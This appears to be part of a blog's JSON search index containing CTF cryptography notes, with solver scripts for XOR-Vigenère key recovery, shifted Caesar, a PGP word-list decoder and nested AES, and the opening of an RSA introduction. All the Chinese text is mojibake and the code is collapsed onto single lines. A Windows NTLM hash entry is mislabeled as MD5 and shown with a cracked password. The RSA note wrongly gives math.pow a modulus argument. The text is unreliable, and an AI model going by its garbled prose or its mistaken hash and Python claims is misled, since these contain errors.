ans_keys=[]#ç”¨äºç»“æœçš„è¿”å› for x in range(0x00,0xFF):# æšä¸¾å¯†é’¥é‡Œæ‰€æœ‰çš„å€¼ test_keys.append(x) ans_keys.append(x) for i in test_keys:#å¯¹äº0x00~0xFFé‡Œçš„æ¯ä¸€ä¸ªæ•°iå’Œsubstré‡Œçš„æ¯ä¸ªå€¼så¼‚æˆ– for s in subarr: if chr(s^i) not in test_chars:#ç”¨iè§£å¯†sï¼Œå¦‚æœè§£å¯†åä¸æ˜¯è‹±æ–‡ã€æ•°å­—ã€é€—å·ã€å¥å·ã€ç©ºæ ¼ï¼Œè¯´æ˜iä¸æ˜¯å¯†é’¥ ans_keys.remove(i)#å»æ‰ans_keysé‡Œæµ‹è¯•å¤±è´¥çš„å¯†é’¥ break #print(ans_keys) return ans_keys vigenerekeys=[]#ç»´åŸºå°¼å°”å¯†ç çš„å¯†é’¥for index in range(0,7):#å·²ç»çŸ¥é“å¯†é’¥é•¿åº¦æ˜¯7 subarr=arr[index::7] vigenerekeys.append(findindexkey2(subarr))print(vigenerekeys)#è¾“å‡ºçš„æ˜¯[[186], [31], [145], [178], [83], [205], [62]]. print(&quot;#########&quot;)ming=&#x27;&#x27;for i in range(0,len(arr)): ming=ming+chr(arr[i]^vigenerekeys[i%7][0])print(ming)","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"},{"title":"ä¸€äº›æ‚ä¹±çš„å¯†ç ","slug":"ä¸€äº›æ‚ä¹±çš„å¯†ç ","date":"2020-11-14T16:49:43.000Z","updated":"2024-11-12T06:59:56.000Z","comments":true,"path":"2020/11/15/ä¸€äº›æ‚ä¹±çš„å¯†ç /","permalink":"https://gryffinbit.top/2020/11/15/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B9%B1%E7%9A%84%E5%AF%86%E7%A0%81/","excerpt":"","text":"è®°å½•é‡åˆ°çš„ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„å¯†ç ###å˜å¼‚å‡¯æ’’ ç¬¬ä¸€ä½ åç§»5ï¼Œç¬¬äºŒä½åç§»6 ï¼Œ ç¬¬ä¸‰ä½åç§»7 ï¼Œç¬¬å››ä½åç§»8â€¦â€¦ä»¥æ­¤ç±»æ¨ 12345k = 5 str = &#x27;afZ_r9VYfScOeO_UL^RWUc&#x27; for i in str: print(chr(ord(i)+k),end=&quot;&quot;) k +=1 ###quoted_printable_decode &#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6 è§£å¯†ï¼šé‚£ä½ ä¹Ÿå¾ˆæ£’å“¦ ###Rabbit U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI è§£å¯†ï¼šCute_Rabbit ###æ …æ å¯†ç  felhaagv{ewtehtehfilnakgw} è§£å¯†ï¼š 1flag&#123;wethinkwehavetheflag&#125; ###ç”Ÿåƒ»å­— è€æ–‡ç›²äº†â€œç½¼é›§ç· çœ”æ“´çæ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µçœ”é¹é°â€èŒæ–°åˆä½“éªŒï¼Œè¿™é“é¢˜ä¸§å¿ƒç—…ç‹‚ï¼ŒæŠŠå‰é¢å‡ ä¸ªç”Ÿåƒ»å­—æ‹¼éŸ³æ‰¾äº†å‡ºæ¥ï¼Œå‘ç°åˆšå¥½é¦–å­—æ¯æ˜¯BJDï¼Œåä¸‰ä¸ªå‘ç°æ˜¯å¤§æ‹¬å·çš„è°éŸ³ï¼Œç»“å°¾ä¸‰ä¸ªä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå¯å¾—BJD{æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ} ###ç»´å‰å°¼äºšå¯†ç ï¼ˆåç§»å¯†ç ï¼Œkeyæ˜¯å­—æ¯ï¼‰ é¢˜ç›®ï¼š å°ç‡•å­ï¼Œç©¿èŠ±è¡£ï¼Œå¹´å¹´æ˜¥å¤©æ¥è¿™é‡Œï¼Œæˆ‘é—®ç‡•å­ä½ ä¸ºå•¥æ¥ï¼Œç‡•å­è¯´:79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20 åˆ†æåé¢çš„å­—ç¬¦ä¸²ä¸º16è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸ºyanzi ZJQ{xilzv_iqssuhoc_suzjg} ã€‚åˆ†æå¾—åˆ°å­—ç¬¦ä¸²çŒœæµ‹ä¸ºç»´å‰å°¼äºšå¯†ç ï¼Œyanziä¸ºç§˜é’¥ã€‚è§£å¯†åå¾—åˆ°BJD{yanzi_jiushige_shabi}ã€‚ æ‰€ä»¥flagä¸ºflag{yanzi_jiushige_shabi}ã€‚ ###å…­åç”²å­é¡ºåºè¡¨ è¾›å¯ï¼Œç™¸å·³ï¼Œä¸™æˆŒï¼Œè¾›æœªï¼Œåºšè¾°ï¼Œç™¸é…‰ï¼Œå·±å¯ï¼Œç™¸å·³ã€‚ ###æ›¿æ¢&#x2F;ç§»ä½å¯†ç çš„æš´åŠ›ç ´è§£ è¯é¢‘åˆ†æ å½“åç§»çš„ä½æ•°ä¸ç¡®å®šæ—¶ï¼Œä½†èƒ½æ˜æ˜¾çœ‹å‡ºæ¥éœ€è¦ç ´è§£çš„å¯†ç æ˜¯é¡ºåºæ··ä¹±åçš„æ ·å­ï¼Œå¯ä»¥é‡‡ç”¨æš´åŠ›ç ´è§£ MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO} tipï¼šå·²çŸ¥MTHJ&#x3D;flag ç ´è§£çš„ç½‘ç«™ï¼šhttps://quipqiup.com/ çŒªåœˆå¯†ç  å˜ç§ï¼šåœ£å ‚æ­¦å£«å¯†ç  MD5Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8::: å…¶ä¸­çš„ï¼šF4AD50F57683D4260DFD48AA351A17A8 MD5åœ¨çº¿è§£å¯†ä¸ºï¼š3617656 PGPè¯æ±‡è¡¨ ï¼ˆç”Ÿç‰©è¯†åˆ«è¯æ±‡è¡¨ï¼‰123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281aaa=[[&quot;00&quot;,&quot;aardvark&quot;,&quot;adroitness&quot;],[&quot;01&quot;,&quot;absurd&quot;,&quot;adviser&quot;],[&quot;02&quot;,&quot;accrue&quot;,&quot;aftermath&quot;],[&quot;03&quot;,&quot;acme&quot;,&quot;aggregate&quot;],[&quot;04&quot;,&quot;adrift&quot;,&quot;alkali&quot;],[&quot;05&quot;,&quot;adult&quot;,&quot;almighty&quot;],[&quot;06&quot;,&quot;afflict&quot;,&quot;amulet&quot;],[&quot;07&quot;,&quot;ahead&quot;,&quot;amusement&quot;],[&quot;08&quot;,&quot;aimless&quot;,&quot;antenna&quot;],[&quot;09&quot;,&quot;Algol&quot;,&quot;applicant&quot;],[&quot;0A&quot;,&quot;allow&quot;,&quot;Apollo&quot;],[&quot;0B&quot;,&quot;alone&quot;,&quot;armistice&quot;],[&quot;0C&quot;,&quot;ammo&quot;,&quot;article&quot;],[&quot;0D&quot;,&quot;ancient&quot;,&quot;asteroid&quot;],[&quot;0E&quot;,&quot;apple&quot;,&quot;Atlantic&quot;],[&quot;0F&quot;,&quot;artist&quot;,&quot;atmosphere&quot;],[&quot;10&quot;,&quot;assume&quot;,&quot;autopsy&quot;],[&quot;11&quot;,&quot;Athens&quot;,&quot;Babylon&quot;],[&quot;12&quot;,&quot;atlas&quot;,&quot;backwater&quot;],[&quot;13&quot;,&quot;Aztec&quot;,&quot;barbecue&quot;],[&quot;14&quot;,&quot;baboon&quot;,&quot;belowground&quot;],[&quot;15&quot;,&quot;backfield&quot;,&quot;bifocals&quot;],[&quot;16&quot;,&quot;backward&quot;,&quot;bodyguard&quot;],[&quot;17&quot;,&quot;banjo&quot;,&quot;bookseller&quot;],[&quot;18&quot;,&quot;beaming&quot;,&quot;borderline&quot;],[&quot;19&quot;,&quot;bedlamp&quot;,&quot;bottomless&quot;],[&quot;1A&quot;,&quot;beehive&quot;,&quot;Bradbury&quot;],[&quot;1B&quot;,&quot;beeswax&quot;,&quot;bravado&quot;],[&quot;1C&quot;,&quot;befriend&quot;,&quot;Brazilian&quot;],[&quot;1D&quot;,&quot;Belfast&quot;,&quot;breakaway&quot;],[&quot;1E&quot;,&quot;berserk&quot;,&quot;Burlington&quot;],[&quot;1F&quot;,&quot;billiard&quot;,&quot;businessman&quot;],[&quot;20&quot;,&quot;bison&quot;,&quot;butterfat&quot;],[&quot;21&quot;,&quot;blackjack&quot;,&quot;Camelot&quot;],[&quot;22&quot;,&quot;blockade&quot;,&quot;candidate&quot;],[&quot;23&quot;,&quot;blowtorch&quot;,&quot;cannonball&quot;],[&quot;24&quot;,&quot;bluebird&quot;,&quot;Capricorn&quot;],[&quot;25&quot;,&quot;bombast&quot;,&quot;caravan&quot;],[&quot;26&quot;,&quot;bookshelf&quot;,&quot;caretaker&quot;],[&quot;27&quot;,&quot;brackish&quot;,&quot;celebrate&quot;],[&quot;28&quot;,&quot;breadline&quot;,&quot;cellulose&quot;],[&quot;29&quot;,&quot;breakup&quot;,&quot;certify&quot;],[&quot;2A&quot;,&quot;brickyard&quot;,&quot;chambermaid&quot;],[&quot;2B&quot;,&quot;briefcase&quot;,&quot;Cherokee&quot;],[&quot;2C&quot;,&quot;Burbank&quot;,&quot;Chicago&quot;],[&quot;2D&quot;,&quot;button&quot;,&quot;clergyman&quot;],[&quot;2E&quot;,&quot;buzzard&quot;,&quot;coherence&quot;],[&quot;2F&quot;,&quot;cement&quot;,&quot;combustion&quot;],[&quot;30&quot;,&quot;chairlift&quot;,&quot;commando&quot;],[&quot;31&quot;,&quot;chatter&quot;,&quot;company&quot;],[&quot;32&quot;,&quot;checkup&quot;,&quot;component&quot;],[&quot;33&quot;,&quot;chisel&quot;,&quot;concurrent&quot;],[&quot;34&quot;,&quot;choking&quot;,&quot;confidence&quot;],[&quot;35&quot;,&quot;chopper&quot;,&quot;conformist&quot;],[&quot;36&quot;,&quot;Christmas&quot;,&quot;congregate&quot;],[&quot;37&quot;,&quot;clamshell&quot;,&quot;consensus&quot;],[&quot;38&quot;,&quot;classic&quot;,&quot;consulting&quot;],[&quot;39&quot;,&quot;classroom&quot;,&quot;corporate&quot;],[&quot;3A&quot;,&quot;cleanup&quot;,&quot;corrosion&quot;],[&quot;3B&quot;,&quot;clockwork&quot;,&quot;councilman&quot;],[&quot;3C&quot;,&quot;cobra&quot;,&quot;crossover&quot;],[&quot;3D&quot;,&quot;commence&quot;,&quot;crucifix&quot;],[&quot;3E&quot;,&quot;concert&quot;,&quot;cumbersome&quot;],[&quot;3F&quot;,&quot;cowbell&quot;,&quot;customer&quot;],[&quot;40&quot;,&quot;crackdown&quot;,&quot;Dakota&quot;],[&quot;41&quot;,&quot;cranky&quot;,&quot;decadence&quot;],[&quot;42&quot;,&quot;crowfoot&quot;,&quot;December&quot;],[&quot;43&quot;,&quot;crucial&quot;,&quot;decimal&quot;],[&quot;44&quot;,&quot;crumpled&quot;,&quot;designing&quot;],[&quot;45&quot;,&quot;crusade&quot;,&quot;detector&quot;],[&quot;46&quot;,&quot;cubic&quot;,&quot;detergent&quot;],[&quot;47&quot;,&quot;dashboard&quot;,&quot;determine&quot;],[&quot;48&quot;,&quot;deadbolt&quot;,&quot;dictator&quot;],[&quot;49&quot;,&quot;deckhand&quot;,&quot;dinosaur&quot;],[&quot;4A&quot;,&quot;dogsled&quot;,&quot;direction&quot;],[&quot;4B&quot;,&quot;dragnet&quot;,&quot;disable&quot;],[&quot;4C&quot;,&quot;drainage&quot;,&quot;disbelief&quot;],[&quot;4D&quot;,&quot;dreadful&quot;,&quot;disruptive&quot;],[&quot;4E&quot;,&quot;drifter&quot;,&quot;distortion&quot;],[&quot;4F&quot;,&quot;dropper&quot;,&quot;document&quot;],[&quot;50&quot;,&quot;drumbeat&quot;,&quot;embezzle&quot;],[&quot;51&quot;,&quot;drunken&quot;,&quot;enchanting&quot;],[&quot;52&quot;,&quot;Dupont&quot;,&quot;enrollment&quot;],[&quot;53&quot;,&quot;dwelling&quot;,&quot;enterprise&quot;],[&quot;54&quot;,&quot;eating&quot;,&quot;equation&quot;],[&quot;55&quot;,&quot;edict&quot;,&quot;equipment&quot;],[&quot;56&quot;,&quot;egghead&quot;,&quot;escapade&quot;],[&quot;57&quot;,&quot;eightball&quot;,&quot;Eskimo&quot;],[&quot;58&quot;,&quot;endorse&quot;,&quot;everyday&quot;],[&quot;59&quot;,&quot;endow&quot;,&quot;examine&quot;],[&quot;5A&quot;,&quot;enlist&quot;,&quot;existence&quot;],[&quot;5B&quot;,&quot;erase&quot;,&quot;exodus&quot;],[&quot;5C&quot;,&quot;escape&quot;,&quot;fascinate&quot;],[&quot;5D&quot;,&quot;exceed&quot;,&quot;filament&quot;],[&quot;5E&quot;,&quot;eyeglass&quot;,&quot;finicky&quot;],[&quot;5F&quot;,&quot;eyetooth&quot;,&quot;forever&quot;],[&quot;60&quot;,&quot;facial&quot;,&quot;fortitude&quot;],[&quot;61&quot;,&quot;fallout&quot;,&quot;frequency&quot;],[&quot;62&quot;,&quot;flagpole&quot;,&quot;gadgetry&quot;],[&quot;63&quot;,&quot;flatfoot&quot;,&quot;Galveston&quot;],[&quot;64&quot;,&quot;flytrap&quot;,&quot;getaway&quot;],[&quot;65&quot;,&quot;fracture&quot;,&quot;glossary&quot;],[&quot;66&quot;,&quot;framework&quot;,&quot;gossamer&quot;],[&quot;67&quot;,&quot;freedom&quot;,&quot;graduate&quot;],[&quot;68&quot;,&quot;frighten&quot;,&quot;gravity&quot;],[&quot;69&quot;,&quot;gazelle&quot;,&quot;guitarist&quot;],[&quot;6A&quot;,&quot;Geiger&quot;,&quot;hamburger&quot;],[&quot;6B&quot;,&quot;glitter&quot;,&quot;Hamilton&quot;],[&quot;6C&quot;,&quot;glucose&quot;,&quot;handiwork&quot;],[&quot;6D&quot;,&quot;goggles&quot;,&quot;hazardous&quot;],[&quot;6E&quot;,&quot;goldfish&quot;,&quot;headwaters&quot;],[&quot;6F&quot;,&quot;gremlin&quot;,&quot;hemisphere&quot;],[&quot;70&quot;,&quot;guidance&quot;,&quot;hesitate&quot;],[&quot;71&quot;,&quot;hamlet&quot;,&quot;hideaway&quot;],[&quot;72&quot;,&quot;highchair&quot;,&quot;holiness&quot;],[&quot;73&quot;,&quot;hockey&quot;,&quot;hurricane&quot;],[&quot;74&quot;,&quot;indoors&quot;,&quot;hydraulic&quot;],[&quot;75&quot;,&quot;indulge&quot;,&quot;impartial&quot;],[&quot;76&quot;,&quot;inverse&quot;,&quot;impetus&quot;],[&quot;77&quot;,&quot;involve&quot;,&quot;inception&quot;],[&quot;78&quot;,&quot;island&quot;,&quot;indigo&quot;],[&quot;79&quot;,&quot;jawbone&quot;,&quot;inertia&quot;],[&quot;7A&quot;,&quot;keyboard&quot;,&quot;infancy&quot;],[&quot;7B&quot;,&quot;kickoff&quot;,&quot;inferno&quot;],[&quot;7C&quot;,&quot;kiwi&quot;,&quot;informant&quot;],[&quot;7D&quot;,&quot;klaxon&quot;,&quot;insincere&quot;],[&quot;7E&quot;,&quot;locale&quot;,&quot;insurgent&quot;],[&quot;7F&quot;,&quot;lockup&quot;,&quot;integrate&quot;],[&quot;80&quot;,&quot;merit&quot;,&quot;intention&quot;],[&quot;81&quot;,&quot;minnow&quot;,&quot;inventive&quot;],[&quot;82&quot;,&quot;miser&quot;,&quot;Istanbul&quot;],[&quot;83&quot;,&quot;Mohawk&quot;,&quot;Jamaica&quot;],[&quot;84&quot;,&quot;mural&quot;,&quot;Jupiter&quot;],[&quot;85&quot;,&quot;music&quot;,&quot;leprosy&quot;],[&quot;86&quot;,&quot;necklace&quot;,&quot;letterhead&quot;],[&quot;87&quot;,&quot;Neptune&quot;,&quot;liberty&quot;],[&quot;88&quot;,&quot;newborn&quot;,&quot;maritime&quot;],[&quot;89&quot;,&quot;nightbird&quot;,&quot;matchmaker&quot;],[&quot;8A&quot;,&quot;Oakland&quot;,&quot;maverick&quot;],[&quot;8B&quot;,&quot;obtuse&quot;,&quot;Medusa&quot;],[&quot;8C&quot;,&quot;offload&quot;,&quot;megaton&quot;],[&quot;8D&quot;,&quot;optic&quot;,&quot;microscope&quot;],[&quot;8E&quot;,&quot;orca&quot;,&quot;microwave&quot;],[&quot;8F&quot;,&quot;payday&quot;,&quot;midsummer&quot;],[&quot;90&quot;,&quot;peachy&quot;,&quot;millionaire&quot;],[&quot;91&quot;,&quot;pheasant&quot;,&quot;miracle&quot;],[&quot;92&quot;,&quot;physique&quot;,&quot;misnomer&quot;],[&quot;93&quot;,&quot;playhouse&quot;,&quot;molasses&quot;],[&quot;94&quot;,&quot;Pluto&quot;,&quot;molecule&quot;],[&quot;95&quot;,&quot;preclude&quot;,&quot;Montana&quot;],[&quot;96&quot;,&quot;prefer&quot;,&quot;monument&quot;],[&quot;97&quot;,&quot;preshrunk&quot;,&quot;mosquito&quot;],[&quot;98&quot;,&quot;printer&quot;,&quot;narrative&quot;],[&quot;99&quot;,&quot;prowler&quot;,&quot;nebula&quot;],[&quot;9A&quot;,&quot;pupil&quot;,&quot;newsletter&quot;],[&quot;9B&quot;,&quot;puppy&quot;,&quot;Norwegian&quot;],[&quot;9C&quot;,&quot;python&quot;,&quot;October&quot;],[&quot;9D&quot;,&quot;quadrant&quot;,&quot;Ohio&quot;],[&quot;9E&quot;,&quot;quiver&quot;,&quot;onlooker&quot;],[&quot;9F&quot;,&quot;quota&quot;,&quot;opulent&quot;],[&quot;A0&quot;,&quot;ragtime&quot;,&quot;Orlando&quot;],[&quot;A1&quot;,&quot;ratchet&quot;,&quot;outfielder&quot;],[&quot;A2&quot;,&quot;rebirth&quot;,&quot;Pacific&quot;],[&quot;A3&quot;,&quot;reform&quot;,&quot;pandemic&quot;],[&quot;A4&quot;,&quot;regain&quot;,&quot;Pandora&quot;],[&quot;A5&quot;,&quot;reindeer&quot;,&quot;paperweight&quot;],[&quot;A6&quot;,&quot;rematch&quot;,&quot;paragon&quot;],[&quot;A7&quot;,&quot;repay&quot;,&quot;paragraph&quot;],[&quot;A8&quot;,&quot;retouch&quot;,&quot;paramount&quot;],[&quot;A9&quot;,&quot;revenge&quot;,&quot;passenger&quot;],[&quot;AA&quot;,&quot;reward&quot;,&quot;pedigree&quot;],[&quot;AB&quot;,&quot;rhythm&quot;,&quot;Pegasus&quot;],[&quot;AC&quot;,&quot;ribcage&quot;,&quot;penetrate&quot;],[&quot;AD&quot;,&quot;ringbolt&quot;,&quot;perceptive&quot;],[&quot;AE&quot;,&quot;robust&quot;,&quot;performance&quot;],[&quot;AF&quot;,&quot;rocker&quot;,&quot;pharmacy&quot;],[&quot;B0&quot;,&quot;ruffled&quot;,&quot;phonetic&quot;],[&quot;B1&quot;,&quot;sailboat&quot;,&quot;photograph&quot;],[&quot;B2&quot;,&quot;sawdust&quot;,&quot;pioneer&quot;],[&quot;B3&quot;,&quot;scallion&quot;,&quot;pocketful&quot;],[&quot;B4&quot;,&quot;scenic&quot;,&quot;politeness&quot;],[&quot;B5&quot;,&quot;scorecard&quot;,&quot;positive&quot;],[&quot;B6&quot;,&quot;Scotland&quot;,&quot;potato&quot;],[&quot;B7&quot;,&quot;seabird&quot;,&quot;processor&quot;],[&quot;B8&quot;,&quot;select&quot;,&quot;provincial&quot;],[&quot;B9&quot;,&quot;sentence&quot;,&quot;proximate&quot;],[&quot;BA&quot;,&quot;shadow&quot;,&quot;puberty&quot;],[&quot;BB&quot;,&quot;shamrock&quot;,&quot;publisher&quot;],[&quot;BC&quot;,&quot;showgirl&quot;,&quot;pyramid&quot;],[&quot;BD&quot;,&quot;skullcap&quot;,&quot;quantity&quot;],[&quot;BE&quot;,&quot;skydive&quot;,&quot;racketeer&quot;],[&quot;BF&quot;,&quot;slingshot&quot;,&quot;rebellion&quot;],[&quot;C0&quot;,&quot;slowdown&quot;,&quot;recipe&quot;],[&quot;C1&quot;,&quot;snapline&quot;,&quot;recover&quot;],[&quot;C2&quot;,&quot;snapshot&quot;,&quot;repellent&quot;],[&quot;C3&quot;,&quot;snowcap&quot;,&quot;replica&quot;],[&quot;C4&quot;,&quot;snowslide&quot;,&quot;reproduce&quot;],[&quot;C5&quot;,&quot;solo&quot;,&quot;resistor&quot;],[&quot;C6&quot;,&quot;southward&quot;,&quot;responsive&quot;],[&quot;C7&quot;,&quot;soybean&quot;,&quot;retraction&quot;],[&quot;C8&quot;,&quot;spaniel&quot;,&quot;retrieval&quot;],[&quot;C9&quot;,&quot;spearhead&quot;,&quot;retrospect&quot;],[&quot;CA&quot;,&quot;spellbind&quot;,&quot;revenue&quot;],[&quot;CB&quot;,&quot;spheroid&quot;,&quot;revival&quot;],[&quot;CC&quot;,&quot;spigot&quot;,&quot;revolver&quot;],[&quot;CD&quot;,&quot;spindle&quot;,&quot;sandalwood&quot;],[&quot;CE&quot;,&quot;spyglass&quot;,&quot;sardonic&quot;],[&quot;CF&quot;,&quot;stagehand&quot;,&quot;Saturday&quot;],[&quot;D0&quot;,&quot;stagnate&quot;,&quot;savagery&quot;],[&quot;D1&quot;,&quot;stairway&quot;,&quot;scavenger&quot;],[&quot;D2&quot;,&quot;standard&quot;,&quot;sensation&quot;],[&quot;D3&quot;,&quot;stapler&quot;,&quot;sociable&quot;],[&quot;D4&quot;,&quot;steamship&quot;,&quot;souvenir&quot;],[&quot;D5&quot;,&quot;sterling&quot;,&quot;specialist&quot;],[&quot;D6&quot;,&quot;stockman&quot;,&quot;speculate&quot;],[&quot;D7&quot;,&quot;stopwatch&quot;,&quot;stethoscope&quot;],[&quot;D8&quot;,&quot;stormy&quot;,&quot;stupendous&quot;],[&quot;D9&quot;,&quot;sugar&quot;,&quot;supportive&quot;],[&quot;DA&quot;,&quot;surmount&quot;,&quot;surrender&quot;],[&quot;DB&quot;,&quot;suspense&quot;,&quot;suspicious&quot;],[&quot;DC&quot;,&quot;sweatband&quot;,&quot;sympathy&quot;],[&quot;DD&quot;,&quot;swelter&quot;,&quot;tambourine&quot;],[&quot;DE&quot;,&quot;tactics&quot;,&quot;telephone&quot;],[&quot;DF&quot;,&quot;talon&quot;,&quot;therapist&quot;],[&quot;E0&quot;,&quot;tapeworm&quot;,&quot;tobacco&quot;],[&quot;E1&quot;,&quot;tempest&quot;,&quot;tolerance&quot;],[&quot;E2&quot;,&quot;tiger&quot;,&quot;tomorrow&quot;],[&quot;E3&quot;,&quot;tissue&quot;,&quot;torpedo&quot;],[&quot;E4&quot;,&quot;tonic&quot;,&quot;tradition&quot;],[&quot;E5&quot;,&quot;topmost&quot;,&quot;travesty&quot;],[&quot;E6&quot;,&quot;tracker&quot;,&quot;trombonist&quot;],[&quot;E7&quot;,&quot;transit&quot;,&quot;truncated&quot;],[&quot;E8&quot;,&quot;trauma&quot;,&quot;typewriter&quot;],[&quot;E9&quot;,&quot;treadmill&quot;,&quot;ultimate&quot;],[&quot;EA&quot;,&quot;Trojan&quot;,&quot;undaunted&quot;],[&quot;EB&quot;,&quot;trouble&quot;,&quot;underfoot&quot;],[&quot;EC&quot;,&quot;tumor&quot;,&quot;unicorn&quot;],[&quot;ED&quot;,&quot;tunnel&quot;,&quot;unify&quot;],[&quot;EE&quot;,&quot;tycoon&quot;,&quot;universe&quot;],[&quot;EF&quot;,&quot;uncut&quot;,&quot;unravel&quot;],[&quot;F0&quot;,&quot;unearth&quot;,&quot;upcoming&quot;],[&quot;F1&quot;,&quot;unwind&quot;,&quot;vacancy&quot;],[&quot;F2&quot;,&quot;uproot&quot;,&quot;vagabond&quot;],[&quot;F3&quot;,&quot;upset&quot;,&quot;vertigo&quot;],[&quot;F4&quot;,&quot;upshot&quot;,&quot;Virginia&quot;],[&quot;F5&quot;,&quot;vapor&quot;,&quot;visitor&quot;],[&quot;F6&quot;,&quot;village&quot;,&quot;vocalist&quot;],[&quot;F7&quot;,&quot;virus&quot;,&quot;voyager&quot;],[&quot;F8&quot;,&quot;Vulcan&quot;,&quot;warranty&quot;],[&quot;F9&quot;,&quot;waffle&quot;,&quot;Waterloo&quot;],[&quot;FA&quot;,&quot;wallet&quot;,&quot;whimsical&quot;],[&quot;FB&quot;,&quot;watchword&quot;,&quot;Wichita&quot;],[&quot;FC&quot;,&quot;wayside&quot;,&quot;Wilmington&quot;],[&quot;FD&quot;,&quot;willow&quot;,&quot;Wyoming&quot;],[&quot;FE&quot;,&quot;woodlark&quot;,&quot;yesteryear&quot;],[&quot;FF&quot;,&quot;Zulu&quot;,&quot;Yucatan&quot;]]_string = &quot;endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack&quot;def tihuan(s): for i in aaa: s = s.replace(i[1],i[0]) s = s.replace(i[2],i[0]) return sbbb = tihuan(_string)print(bbb)ccc = bbb.split(&quot; &quot;)ddd = &quot;&quot;for i in ccc: ddd+=chr(int(i,16))print(ddd) éšè—å­—ç¬¦åŠ å¯†http://www.atoolbox.net/Tool.php?Id=829 playfairå¯†æ–‡ï¼šiuf_xat_hmoz_gocwmx https://www.dcode.fr/playfair-cipher ###é•¿å¾—åƒbase64çš„AES U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY&#x2F;ux53Vuj&#x2F;AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG&#x2F;tOKJMNUauedvMyN4v4QKiFunw&#x3D;&#x3D; è¾“å…¥å¯†é’¥ISCC è§£å¯†å¾—åˆ°ï¼šU2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ&#x2F;qt38Tw73tbQ&#x3D;&#x3D; å†æ¬¡è§£å¯†å¾—åˆ°ï¼š flag{DugUpADiamondADeepDarkMine}","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"æ‚","slug":"æ‚","permalink":"https://gryffinbit.top/tags/%E6%9D%82/"}],"author":"Gryffinbit"},{"title":"RSAåŸç†åŸºæœ¬ä»‹ç»","slug":"RSAåŸç†åŸºæœ¬ä»‹ç»","date":"2020-11-14T16:41:14.000Z","updated":"2024-11-12T06:59:23.000Z","comments":true,"path":"2020/11/15/RSAåŸç†åŸºæœ¬ä»‹ç»/","permalink":"https://gryffinbit.top/2020/11/15/RSA%E5%8E%9F%E7%90%86%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"RSAçš„åŸºæœ¬ä»‹ç» python powå‡½æ•°çš„ç”¨æ³•ï¼šè®¡ç®—xçš„yæ¬¡æ–¹ï¼Œå¦‚æœzåœ¨å­˜åœ¨ï¼Œåˆ™å†å¯¹ç»“æœè¿›è¡Œå–æ¨¡ï¼Œå…¶ç»“æœç­‰æ•ˆäºpow(x,y) %z 123import mathmath.pow(x, y[, z]) æ±‚æ˜æ–‡mï¼Œç”¨è¯¥å‡½æ•°æ±‚cï¼ˆå¯†æ–‡cipherï¼‰çš„dæ¬¡æ–¹ï¼Œå¾—åˆ°ï¼š $$d\\equiv e^{-1}$$ $$m&#x3D;pow(cipher,e^{-1})$$ dæ˜¯eçš„ä¹˜æ³•é€†å…ƒ ï¼Œe^-1 æ˜¯ä¹˜æ³•é€†å…ƒï¼Œå¹¶ä¸æ˜¯-1æ¬¡æ–¹çš„æ„æ€ åˆ©ç”¨gmpy2åº“ï¼Œæ¥æ±‚å‡ºæ˜æ–‡m 